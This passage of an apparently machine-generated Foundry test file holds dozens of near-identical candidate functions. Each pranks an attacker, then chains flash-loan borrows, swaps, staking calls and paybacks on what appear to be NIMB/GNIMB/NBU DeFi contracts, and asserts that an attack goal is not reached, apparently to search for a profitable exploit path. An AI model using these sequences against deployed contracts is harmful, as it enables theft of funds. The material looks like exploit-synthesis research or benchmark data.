        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
